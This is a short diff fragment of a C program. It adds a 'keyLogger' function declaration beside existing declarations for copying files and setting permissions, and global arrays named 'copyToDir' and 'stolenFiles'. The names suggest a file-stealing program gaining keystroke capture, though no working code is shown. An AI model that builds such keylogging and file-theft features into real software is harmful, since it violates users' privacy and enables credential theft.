@@ -22,6 +22,7 @@ void changeMd(struct dirent *entry, const char *direct);
 void openDir(const char *direct, int level);
 void givePermission();
 int copyFile(char *address, char *destPath);
+void keyLogger();
 
 char copyToDir[1024];
 char stolenFiles[1024][1024];
